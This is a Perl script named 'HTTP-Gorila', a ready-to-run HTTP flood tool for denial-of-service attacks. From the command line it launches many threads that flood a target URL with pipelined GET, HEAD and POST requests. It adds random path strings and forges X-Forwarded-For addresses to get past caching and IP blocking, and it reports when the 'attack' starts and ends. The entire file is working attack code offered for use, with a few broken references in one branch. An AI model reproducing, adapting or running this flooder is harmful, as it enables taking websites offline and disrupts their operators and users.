#!/usr/bin/perl
use Socket;
use IO::Socket::INET;
use threads ('yield',
                'exit' => 'threads_only',
                'stringify');
use threads::shared;
package control;

my $ip;

sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("No mas IPs!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;



my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my @ghp = ('GET','HEAD','POST','POST');
my $randsemilla = "";

sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}


sub sender {

    my ($max,$puerto,$host,$file) = @_;
    my $sock;
	my $endtime = time() + ($time ? $time : 1000000);
	my $actualmethod;
	
    for (;time() <= $endtime;) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
			
			if(length($randsemilla) > 32){
				$randsemilla = $vals[int(rand($#vals))];
			}
			else{
				$randsemilla .= $vals[int(rand($#vals))];
			}
			
			if($method eq "GHP"){
				$actualmethod = $ghp[int(rand($#ghp))];
			}
			else{
				$actualmethod = $method;
			}
			
            $paquete .= join "",$actualmethod," ",$file,$randsemilla," HTTP/1.1\r\nHost: ",$host,"\r\nX-Forwarded-For: ",$ipfake,".",int(rand(255)+1),".",int(rand(255)+1),"\r\nUser-Agent: ",$ua,"\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: *\r\nAccept-Charset: *r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender_pps {

    my ($max,$puerto,$host,$file) = @_;
    my $sock;
	my $endtime = time() + ($time ? $time : 1000000);
	my $actualmethod = "HEAD";
	
    for (;time() <= $endtime;) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            next;
        }
        #for($i=0;$i<$porconexion;$i++) {
		#
        #    $paquete .= join "",$actualmethod," ",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: *\r\nAccept-Charset: *r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        #}
        #$paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
		
		for($i=0;$i<$porconexion;$i++) {
 
            $paquete .= join "",$actualmethod," ",$file," HTTP/1.1\r\nHost: ",$host,"\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
		
        print $sock $paquete;
    }
}

#sub sender_pps {
#
#    my ($puerto,$host,$paquete) = @_;
#    my $sock;
#    my $sumador :shared;
#	my $endtime = time() + ($time ? $time : 1000000);
#    for (;time() <= $endtime;) {
#        $sock = &socker($host,$puerto);
#        unless($sock) {
#            sleep(1);
#            next;
#        }
#        print $sock $paquete;
#    }
#}

sub comenzar {

    $SIG{'KILL'} = sub { print "Killed...\n"; threads->exit(); };
    $url = $ARGV[0];
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $method = $ARGV[3];
	$ipfake = $ARGV[4];
	$time = $ARGV[5];

	
	$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$al = "fr";
	
	#system('start https://www.youtube.com/watch?v=qmNWShAeCTc');
	system('title HTTP-Gorila Powerfull banana launcher @ by Echo');
	system('cls');
    if($porconexion < 1) {
        print "[-]Invalid arg 3...\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("[x] Invalid URL!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    $file = "/".$file if($file !~ /^\//);
	

	
	print '
                                        __,__
                               .--.  .-"     "-.  .--.
                              / .. \/  .-. .-.  \/ .. \
                             | |  \'|  /   Y   \  |\'  | |
                             | \   \  \ 0 | 0 /  /   / |
                              \ \'- ,\.-"""""""-./, -\' /
                               `\'-\' /_   ^ ^   _\ \'-\'`
                               .--\'|  \._ _ _./  |\'--. 
                             /`    \   \.-.  /   /    `\
                            /       \'._/  |-\' _.\'       \
                           /          ;  /--~\'   |       \
                          /        .\'\|.-\--.     \       \
                         /   .\'-. /.-.;\  |\|\'~\'-.|\       \
                         \       `-./`|_\_/ `     `\'.      \
                          \'.      ;     ___)        \'.`;    /
                            \'-.,_ ;     ___)          \/   /
                             \   ``\'------\'\       \   `  /
                              \'.    \       \'.      |   ;/_
                            ___>     \'.       \_ _ _/   ,  \'--.
                          .\'   \'.   .-~~~~~-. /     |--\'`~~-.  \
                         // / .---\'/  .-~~-._/ / / /---..__.\'  /
                        ((_(_/    /  /      (_(_(_(---.__    .\'
                                  | |     _              `~~`
                                  | |     \\.
                                   \ \'....\' |
                                    \'.,___./            
	
                                                                                       
,--.  ,--.,--------.,--------.,------.         ,----.                 ,--.,--.         
|  \'--\'  |\'--.  .--\'\'--.  .--\'|  .--. \',-----.\'  .-./    ,---. ,--.--.`--\'|  | ,--,--. 
|  .--.  |   |  |      |  |   |  \'--\' |\'-----\'|  | .---.| .-. ||  .--\',--.|  |\' ,-.  | 
|  |  |  |   |  |      |  |   |  | --\'        \'  \'--\'  |\' \'-\' \'|  |   |  ||  |\\ \'-\'  | 
`--\'  `--\'   `--\'      `--\'   `--\'             `------\'  `---\' `--\'   `--\'`--\' `--`--\' 
	';
	
	if($method eq "GHP"){
		print "\r\n[*] Target: ",$host,"\n[*] Path: ",$file,"\n[*] Port: ",$puerto,"\n[*] Method: GHP [GET + HEAD + POST]\n[*] Fake IPs: ",$ARGV[4] . ".*.*\n[*] Duration: " . $ARGV[5] . "\n\n";
	}
	elsif($method eq "PPS"){
		print "\r\n[*] Target: ",$host,"\n[*] Path: ",$file,"\n[*] Port: ",$puerto,"\n[*] Method: PPS\n[*] Fake IPs: ",$ARGV[4] . ".*.*\n[*] Duration: " . $ARGV[5] . "\n\n";
	}
	else{
		print "\r\n[*] Target: ",$host,"\n[*] Path: ",$file,"\n[*] Port: ",$puerto,"\n[*] Method: ",$method,"\n[*] Fake IPs: ",$ARGV[4] . ".*.*\n[*] Duration: " . $ARGV[5] . "\n\n";
	}
    
    if($ipfake eq "") {
        # envio repetitivo
		if(length($randsemilla) > 32){
			$randsemilla = $vals[int(rand($#vals))];
		}
		else{
			$randsemilla .= $vals[int(rand($#vals))];
		}
		
        my $paquetebase = join "",$method," ",$file,$randsemilla," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: ",$ae,"\r\nAccept-Charset: ",$ac,"\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $porconexion;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } 
	elsif($method eq "PPS") {
        # envio con ip...
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
			print "[i] Starting bananeiras " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender_pps', ($porconexion,$puerto,$host,$file));
        }
		print "[i] All threads started!          \r\n";
    }
	else {
        # envio con ip...
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
			print "[i] Starting bananeiras " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
        }
		print "[i] All threads started!          \r\n";
    }
    print "[i] Attack started!\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print "[i] Attack ended\n";
}


if($#ARGV > 4) {
    comenzar();
} else {
    die("[i] Use: HTTP-Gorila.pl [http://google.com/?q=] [Connections] [Requests per connection] [Method] [Initial false IP (13.37)] [Duration]\n");
}